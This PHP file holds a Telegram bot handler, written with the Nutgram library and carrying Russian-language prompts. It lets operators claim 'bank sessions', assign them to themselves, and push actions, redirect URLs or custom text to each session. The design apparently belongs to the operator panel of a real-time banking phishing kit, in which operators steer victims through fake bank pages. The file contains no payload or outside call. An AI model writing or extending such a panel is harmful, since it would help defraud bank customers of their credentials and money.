<?php

namespace App\Telegram\Handlers;

use App\Enums\ActionType;
use App\Events\BankSessionUpdated;
use App\Models\Admin;
use App\Models\BankSession;
use SergiX44\Nutgram\Nutgram;

class ActionHandler
{
    public function handle(Nutgram $bot, string $sessionId, string $actionType): void
    {
        /** @var Admin $admin */
        $admin = $bot->get('admin');

        $type = ActionType::tryFrom($actionType);
        if ($type === null) {
            $bot->answerCallbackQuery(text: '⚠️ Неизвестное действие');
            return;
        }

        $session = BankSession::find($sessionId);
        if ($session === null) {
            $bot->answerCallbackQuery(text: '⚠️ Сессия не найдена');
            return;
        }

        if ($session->isAssigned() && $session->admin_id !== $admin->id) {
            $bot->answerCallbackQuery(text: '❌ Сессия назначена другому оператору', show_alert: true);
            return;
        }

        if ($session->admin_id === null) {
            $session->admin_id = $admin->id;
            $session->save();
        }

        if ($type->requiresText() || $type->requiresUrl()) {
            $admin->setPendingAction([
                'type'      => 'session',
                'sessionId' => $session->id,
                'actionType'=> $type->value,
            ]);
            $prompt = $type->requiresUrl()
                ? 'Отправьте URL для редиректа следующим сообщением.'
                : 'Отправьте текст для ' . $type->value . ' следующим сообщением.';
            $bot->answerCallbackQuery();
            $bot->sendMessage($prompt);
            return;
        }

        $session->action_type = ['type' => $type->value];
        $session->last_activity_at = now();
        $session->save();
        BankSessionUpdated::dispatch($session);
        $bot->answerCallbackQuery(text: '✓ ' . $type->buttonLabel());
    }
}
